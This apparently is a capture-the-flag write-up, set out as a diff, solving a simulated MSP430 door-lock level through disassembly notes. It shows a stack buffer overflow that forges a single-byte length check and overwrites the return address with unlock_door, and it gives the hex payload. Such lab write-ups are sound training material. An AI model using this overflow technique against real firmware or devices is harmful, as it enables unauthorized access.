@@ -1,0 +1,58 @@
+Lock overview:
+- A firmware update rejects passwords which are too long.
+- This lock is attached to the LockIT Pro HSM-1.
+
+4438 <main>
+4438:  b012 2c45      call	#0x452c <login>
+
+452c <login>
+452c:  3150 eeff      add	#0xffee, sp
+4530:  f140 0200 1100 mov.b	#0x2, 0x11(sp)
+4536:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
+453a:  b012 f845      call	#0x45f8 <puts>
+453e:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
+4542:  b012 f845      call	#0x45f8 <puts>
+
+not interesting.
+
+4546:  3e40 3f00      mov	#0x3f, r14
+454a:  3f40 0024      mov	#0x2400, r15
+454e:  b012 e845      call	#0x45e8 <getsn>
+
+reads 63 bytes into memory
+
+4552:  3e40 0024      mov	#0x2400, r14
+4556:  0f41           mov	sp, r15
+4558:  b012 2446      call	#0x4624 <strcpy>
+
+copies from 0x2400 to r15 until it encounters a 00
+Break reveals r15 is 43ec
+
+455c:  0f41           mov	sp, r15
+455e:  b012 5244      call	#0x4452 <test_password_valid>
+4562:  0f93           tst	r15
+4564:  0524           jz	#0x4570 <login+0x44>
+4566:  b012 4644      call	#0x4446 <unlock_door>
+456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
+456e:  023c           jmp	#0x4574 <login+0x48>
+4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
+4574:  b012 f845      call	#0x45f8 <puts>
+4578:  f190 0200 1100 cmp.b	#0x2, 0x11(sp)
+457e:  0624           jeq	#0x458c <login+0x60>
+4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
+4584:  b012 f845      call	#0x45f8 <puts>
+4588:  3040 3c44      br	#0x443c <__stop_progExec__>
+458c:  3150 1200      add	#0x12, sp
+4590:  3041           ret
+
+<test_password_valid> checks the pass and we unlock door accordingly.
+Apparently 4578 is the length checking mechanism and it works by checking if the byte at address 43fd is 0x2.
+We can easily bypass this restriction by just having a 02 in the 18th byte of the input.
+Breaking at 458c reveals that the sp is at 43fe when we wish to return.
+We can easily overflow and set the return address to that of <unlock_door>.
+
+17 bytes of junk + 02 + <unlock_door> address
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa024644
+
+Door unlocked.
